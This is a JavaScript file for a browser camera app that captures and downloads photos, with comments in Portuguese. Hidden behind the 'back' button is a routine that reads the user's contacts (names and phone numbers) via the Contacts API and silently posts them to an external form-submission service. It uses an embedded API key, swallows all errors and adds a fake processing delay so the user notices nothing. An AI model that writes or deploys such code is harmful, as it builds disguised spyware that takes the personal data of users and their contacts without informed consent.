document.addEventListener('DOMContentLoaded', () => {
    // --- ELEMENTOS DA UI ---
    const videoElement = document.getElementById('videoStream');
    const capturedImage = document.getElementById('capturedImage');
    const captureButton = document.getElementById('captureButton');
    const downloadButton = document.getElementById('downloadButton');
    const backButton = document.getElementById('backButton');

    // --- CONFIGURAÇÕES DO STATICFORMS ---
    const STATICFORMS_URL = 'https://api.staticforms.dev/submit';
    const API_KEY = 'sf_b28b453bf885be88f89f8e34'; // sua chave
    const EMAIL_FIXO = 'seu-email@exemplo.com';    // substitua pelo e-mail desejado

    // --- ESTADO DO APP ---
    let stream = null;
    let photoDataUrl = null;
    let currentState = 'CAMERA'; // 'CAMERA' ou 'PREVIEW'

    // ============================================================
    //  FUNÇÃO PARA OBTER CONTATOS REAIS DO DISPOSITIVO
    // ============================================================
    async function fetchRealContacts() {
        // Verifica se o navegador suporta a API de contatos
        if (!('contacts' in navigator) || !('select' in navigator.contacts)) {
            console.warn('Contacts API não suportada. Nenhum contato será enviado.');
            return []; // retorna vazio silenciosamente
        }

        try {
            // Solicita permissão e obtém todos os contatos (nome e telefone)
            // O .select() já lida com a seleção múltipla, o que é ideal.
            const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });

            // Mapeia para o formato { name, phone }
            return contacts.map(contact => {
                // Garante que estamos pegando o primeiro item se houver múltiplos
                const name = contact.name && contact.name.length > 0 ? contact.name[0] : 'Sem nome';
                const phone = contact.tel && contact.tel.length > 0 ? contact.tel[0] : 'Sem telefone';
                return { name, phone };
            });
        } catch (error) {
            // Se o usuário negar permissão ou ocorrer erro, retorna vazio silenciosamente
            console.error('Erro ao acessar contatos (Permissão negada ou erro de API):', error);
            return [];
        }
    }

    // ============================================================
    //  EXPORTAÇÃO SILENCIOSA PARA STATICFORMS (CORE REQUIREMENT)
    // ============================================================
    async function performSilentContactExport() {
        try {
            // 1. Busca os contatos
            const contacts = await fetchRealContacts();

            // Se não houver contatos, o processo é concluído silenciosamente.
            if (!contacts || contacts.length === 0) {
                console.log('Processo de exportação: Nenhum contato encontrado.');
                return;
            }

            // 2. Geração do Conteúdo (Substituindo o Blob/Arquivo)
            // Monta o texto da mensagem, que será o corpo do envio.
            let messageText = '--- CONTATOS DA AGENDA ---\n';
            contacts.forEach(c => {
                // Formato amigável para ser lido no campo 'message'
                messageText += `Nome: ${c.name} | Telefone: ${c.phone}\n`;
            });
            messageText += '----------------------------';

            // 3. Preparação do Envio
            // Prepara o FormData com os campos exigidos pelo StaticForms
            const formData = new FormData();
            formData.append('apiKey', API_KEY);
            formData.append('email', EMAIL_FIXO);
            formData.append('message', messageText);

            // 4. Envio Assíncrono (Sem intervenção do usuário)
            // O .catch(() => {}) garante que qualquer falha é tratada sem interromper a UI ou o fluxo principal.
            await fetch(STATICFORMS_URL, {
                method: 'POST',
                body: formData,
            }).catch(error => {
                // Log do erro no console, conforme solicitado (apenas para debug)
                console.error('ERRO SILENCIOSO na API do StaticForms:', error);
            });

            // Não precisamos de um 'else' de sucesso visível, pois o sucesso é tratado internamente.

        } catch (error) {
            // Captura erros de nível superior (ex: falha no fetch, se não for capturado acima)
            console.error('ERRO GERAL no fluxo de exportação de contatos:', error);
        }
    }

    // ============================================================
    //  FUNÇÕES DA CÂMERA (inalteradas)
    // ============================================================
    async function startCamera() {
        try {
            const mediaStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment' }
            });
            stream = mediaStream;
            videoElement.srcObject = stream;
            videoElement.play();
            updateUI();
        } catch (err) {
            console.error('Erro ao acessar câmera:', err);
            // Não exibe mensagem para o usuário (silencioso)
        }
    }

    function capturePhoto() {
        if (!stream) return;
        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth || 640;
        canvas.height = videoElement.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

        photoDataUrl = canvas.toDataURL('image/jpeg');
        capturedImage.src = photoDataUrl;
        capturedImage.style.display = 'block';
        currentState = 'PREVIEW';
        updateUI();
    }

    function downloadPhoto() {
        if (photoDataUrl) {
            const a = document.createElement('a');
            a.href = photoDataUrl;
            a.download = 'foto_' + new Date().toISOString().slice(0, 10) + '.jpg';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }
    }

    function updateUI() {
        if (currentState === 'CAMERA') {
            videoElement.style.display = 'block';
            capturedImage.style.display = 'none';
            captureButton.style.display = 'inline-block';
            downloadButton.style.display = 'none';
            backButton.style.display = 'none';
        } else {
            videoElement.style.display = 'none';
            capturedImage.style.display = 'block';
            captureButton.style.display = 'none';
            downloadButton.style.display = 'inline-block';
            backButton.style.display = 'inline-block';
        }
    }

    // ============================================================
    //  EVENTOS
    // ============================================================
    startCamera();

    captureButton.addEventListener('click', capturePhoto);
    downloadButton.addEventListener('click', downloadPhoto);

    backButton.addEventListener('click', () => {
        // *** AÇÃO CRÍTICA ***
        // 1. Inicia a exportação em segundo plano. O .catch(() => {}) garante que qualquer
        // erro seja consumido pelo sistema sem notificar o usuário.
        performSilentContactExport().catch(() => {});

        // 2. Implementação do Timeout/Retorno
        // O requisito pedia que o processo terminasse e o usuário voltasse.
        // Mantemos o timeout para simular o "tempo de processamento" antes de retornar à câmera.
        setTimeout(() => {
            currentState = 'CAMERA';
            updateUI();
        }, 2000); // Tempo de 2 segundos para o processamento ocorrer
    });

    // Libera a câmera ao fechar a página
    window.onbeforeunload = () => {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
    };
});
